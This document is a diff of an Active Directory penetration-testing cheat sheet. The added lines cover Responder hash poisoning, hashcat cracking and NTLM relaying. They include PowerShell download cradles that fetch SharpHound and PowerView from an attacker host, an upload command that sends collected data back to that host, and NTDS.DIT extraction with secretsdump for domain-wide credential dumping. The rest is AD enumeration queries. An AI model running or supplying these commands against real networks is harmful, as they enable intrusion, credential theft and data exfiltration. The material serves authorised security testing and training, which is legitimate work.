@@ -1,32 +1,92 @@
-
 Active Directory
 
 
+# Responder
+
+Use Responder to poison LLMNR/NBT-NS requests and capture NTLM/NTLNv2 hashes. This happens when you
+  try to identify a host and DNS fails.
+
+responder -A -I eth0
+responder -I eth0 -wrd
+
+- Crack the hash
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
+
+- Relay NTLMv2 hashes if SMB Signing is disabled.
+cd /opt/CrackMapExec/cme/thirdparty/impacket/examples/
+ntlmrelayx.py
+
+- Host discovery and enumeration
+netdiscover -i eth0 -r <CIDR>
+nmap -Pn -n -T4 --open -p- -sC -sV -iL targets.txt
+   Or use Discover which combines nmap, nmap scripts and Metasploit auxiliary modules.
+------------------------------------------------------------------------------------------------------
+
 # BloodHound
-cd to a discrete, writable directory (c:\users\<user>\appdata\local).
 
-iex (new-object net.webclient).downloadstring('http://<attacker IP>/BloodHound.ps1')
+Firefox > seach neo4j download
+You must enter a valid email address to receive download link.
 
-Invoke-Bloodhound
+tar -zxvf neo4j-enterprise-4.0.0-unix.tar.gz
+cd neo4j-enterprise-4.0.0/bin/
 
-Bloodhound will create the following files:
-	group_memberships.csv
-	local_admins.csv
-	trusts.csv
-	user_sessions.csv
+./neo4j console
+firefox http://localhost:7474/ &
+Enter the default password: neo4j
+Change the password
 
-Download the files as needed, then delete files dropped to disk.
-=========================================================================================================================
+cd /opt/BloodHound-v3/Ingestors/
+python -m SimpleHTTPServer
+
+- Windows
+C:\> mkdir temp
+C:\> cd temp
+C:\temp> powershell -nop -exec bypass "IEX (New-Object Net.Webclient).DownloadFile('http://<attacker IP>:8000/SharpHound.exe', 'C:\temp\SharpHound.exe')"
+
+SharpHound.exe -c LoggedOn                        Run the following as a user that has admin rights
+SharpHound.exe -c Session                         On subseqequent runs just collect session data
+
+This will generate a zip file
+
+d/l the zip file to Kali
+powershell -nop -exec bypass "IEX (New-Object Net.Webclient).UploadString('http://<attacker IP>/sharp.zip',"<PostDATA>")"
+
+Open the BloodHound UI
+Drag and drop the zip file into the UI
+------------------------------------------------------------------------------------------------------
+
+# Domain controller
+
+nbtstat -a <target IP>
+
+The netbios hex code “1C” next to the domain name signifies that the system being polled is a domain
+controller for the domain name listed on the left. If the “1C” would have been next to an Inet service
+it would have signified it was an IIS server.
+
+Note the differences between the U and the G. U = UNIQUE and G = GROUP. When you see a hex code next
+to UNIQUE it is usually associated with the computer itself. With GROUP it is associated with the
+workgroup or domain.
+
+- Use the following MSF module to authenticate to the DC via SMB, create a volume shadow copy of the
+system drive, and downloads copies of NTDS.DIT and SYSTEM hive. Then use Impacket to perform
+extraction of the hashes.
+auxiliary/admin/smb/psexec_ntdsgrab
+impacket-secretsdump -system SYSTEM -ntds NTDS.DIT LOCAL
+
+impacket-secretsdump -hashes <hash> -just-dc LAB/dc\$@10.0.0.1
+------------------------------------------------------------------------------------------------------
 
 # PowerView
+
 cd to a discrete, writable directory (c:\users\<user>\appdata\local).
 
 iex (new-object net.webclient).downloadstring('http://<attacker IP>/PowerView.ps1')
 
 Invoke-ACLScanner | Export-PowerViewCSV acls.csv
-=========================================================================================================================
+------------------------------------------------------------------------------------------------------
 
 # ADACLScanner
+
 cd to a discrete, writable directory (c:\users\<user>\appdata\local).
 
 iex (new-object net.webclient).downloadfile('http://<target IP>/ADACLScan.ps1', 'ADACLScan.ps1')
@@ -38,23 +98,23 @@ iex (new-object net.webclient).downloadfile('http://<target IP>/ADACLScan.ps1', 
 .\ADACLScan.ps1 -Base "OU=CORP,DC=CONTOS,DC=COM" -HTML
 
 File will be saved to something like: domain_DOMAIN_adAclOutput<date>_<time>.csv or .htm
-=========================================================================================================================
+------------------------------------------------------------------------------------------------------
 
 # Show Domain Controllers (DC)
 dsquery server
 get-netdomaincontroller
 net group “domain controllers” /domain
-net view \\<server>			DCs contain SYSVOL and NETLOGON shares.
-cmd.exe /c set				LOGONSERVER variable.
+net view \\<server>			     DCs contain SYSVOL and NETLOGON shares
+cmd.exe /c set				     LOGONSERVER variable
 
 # Show DC in a specific domain
 dsquery server -domain <something.int>
 get-netdomaincontroller -domain <something.int>
-nslookup <something.int>	Internally, this will likely return DCs that are DNS servers.
-nslookup 					pseudo-shell
+nslookup <something.int>	Internally, this will likely return DCs that are DNS servers
+nslookup 					     pseudo-shell
 	set type=all
 	_ldap._tcp.<something.int>
-nbtstat -a					Look for the attribute 1C.
+nbtstat -a					Look for the attribute 1C
 
 # Show DCs forest-wide
 dsquery server -forest
@@ -69,7 +129,7 @@ get-netcomputer -fulldata | select-object dnshostname,description,operatingsyste
 
 # Show servers based on description
 dsquery * -filter “&(objectclass=computer)(operatingsystem=*server*)” -attr dnshostname,description,operatingsystem,operatingsystemversion -limit 0
-=========================================================================================================================
+------------------------------------------------------------------------------------------------------
 
 # Show all Active Directory (AD) user accounts
 dsquery user -limit 0
@@ -89,7 +149,7 @@ get-netuser -filter "useraccountcontrol>=65535" | select-object samaccountname,n
 dsquery.exe * -filter "(serviceprincipalname=*)" -attr samaccountname, serviceprincipalname
 dsquery.exe * -filter "&(serviceprincipalname=*)(samaccounttype=805306368)" -attr samaccountname,serviceprincipalname
 get-netuser -spn | select-object samaccountname,serviceprincipalname
-=========================================================================================================================
+------------------------------------------------------------------------------------------------------
 
 # Show administrators
 dsquery * -filter “&(objectclass=user)(admincount=1)” -attr samaccountname,name
@@ -116,7 +176,7 @@ net group “enterprise admins” /domain
 dsquery * -filter “name=administrators” -attr member -l
 get-netgroup -fulldata -groupname "administrators" | select-object member
 net localgroup administrators /domain
-=========================================================================================================================
+------------------------------------------------------------------------------------------------------
 
 # Show Organizational Units (OU)
 dsquery ou -limit 0
@@ -128,7 +188,7 @@ dsquery * “ou=something,dc=domain,dc=int” -filter objectclass=user
 
 # Show child OUs under parent OU
 dsquery * “ou=something,dc=domain,dc=int” -filter objectcategory=organizationalunit) -attr name
-=========================================================================================================================
+------------------------------------------------------------------------------------------------------
  
 # Show All Group Policy Objects (GPO) data
 dsquery * -filter “(objectclass=grouppolicycontainer)” -attr *
@@ -141,7 +201,7 @@ get-netgpo | select-object name,displayname
 # Show OUs and applied GPOs
 dsquery * -filter “(objectcategory=organizationalunit)” -attr distinguishedname, gplink
 get-netou -fulldata | select-object distinguishedname, gplink
-=========================================================================================================================
+------------------------------------------------------------------------------------------------------
 
 # Show Trust Relationships
 dsquery * -filter “(objectclass=TrustedDomain)” -attr trustpartner,flatname,trustdirection
@@ -154,6 +214,6 @@ dsquery site
 get-netsite
 dsquery * “cn=subnets,cn=sites,cn=configuration,dc=<something>,dc=<int>” -attr description,cn,siteobject
 
-# Show AD Partitions
+# Show Active Directory Partitions
 dsquery partition
 
